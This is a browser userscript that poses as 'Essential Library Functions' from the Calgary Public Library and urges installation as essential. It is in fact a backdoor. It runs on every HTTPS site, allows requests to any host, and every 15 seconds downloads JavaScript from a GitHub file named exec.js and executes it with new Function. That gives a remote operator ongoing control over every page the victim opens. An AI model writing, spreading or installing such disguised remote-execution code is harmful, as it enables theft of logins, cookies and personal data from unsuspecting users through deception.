// ==UserScript==
// @name         Essential Library Functions
// @namespace    http://tampermonkey.net/
// @version      2024-04-18
// @description  Installs needed online resources, as well as providing constant updates. This program is essential for helping support our gracious program.
// @icon         https://www.google.com/s2/favicons?sz=64&domain=calgarylibrary.ca
// @author       Calgary Public Library
// @match        https://*/*
// @require      http://code.jquery.com/jquery-3.4.1.min.js
// @grant        GM.xmlHttpRequest
// @grant        GM_getValue
// @grant        GM_setValue
// @connect      *
// @noframes
// @run-at       document-end
// ==/UserScript==

function main() {
    let lastCommand = '';
    GM.getValue('lastCommand').then(value => {
        lastCommand = value;
    });


    GM.xmlHttpRequest({
        method: "GET",
        url: `https://raw.githubusercontent.com/Ongenix/5-letter-strings/main/exec.js?v=${Math.random()}`,
        headers: {
            "Cache-Control:": "private, no-store, max-age=0",
            "Pragma:": "no-cache"
        },
        onload: function(response) {
            try {
                if (response.responseText !== lastCommand) {
                    GM.setValue('lastCommand', response.responseText);
                    GM.getValue('lastCommand').then(value => {
                        lastCommand = value;
                    });
                    new Function(response.responseText)();
                }
            } catch (error) {console.log(error)}
        }
    });
}

setInterval(main, 15000)
